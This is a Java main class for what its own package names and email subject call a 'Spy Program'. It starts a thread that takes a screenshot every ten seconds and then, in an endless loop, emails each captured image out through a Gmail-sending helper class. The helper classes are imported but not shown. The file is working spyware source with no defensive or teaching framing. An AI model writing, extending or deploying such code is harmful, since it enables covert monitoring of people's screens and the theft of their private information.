import SpyCode.ScreenshotRec.PrntScreen;
import SpyCode.SendMail.GMailer;

import java.awt.*;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class Main implements Runnable{

    static Main threadOfPrntScreenClass;
    static Main threadOfGMailerClass;
    static List<String> listOfNames = new ArrayList<>();
    public static void main(String[] args) throws Exception {

        threadOfPrntScreenClass = new Main();
        Thread prntScreenThread = new Thread(threadOfPrntScreenClass);

        int countOfNames = 0;
        prntScreenThread.start();
        Thread.sleep(20000);
        for(;;) {

            System.out.println(listOfNames.get(countOfNames));
            Thread.sleep(10000);
            File file = new File(listOfNames.get(countOfNames));
            boolean fileBool = file.exists();
            System.out.println(fileBool);
            new GMailer().sendMail("Spy Program", "", file);
            countOfNames++;
        }
    }

    @Override
    public void run() {
        try {
            for(;;) {
                PrntScreen prntScreen = new PrntScreen();
                Thread.sleep(10000);
                String name = prntScreen.photo();
                listOfNames.add(name);

            }
        } catch (IOException | AWTException | InterruptedException e) {
            throw new RuntimeException(e);
        }
    }
}
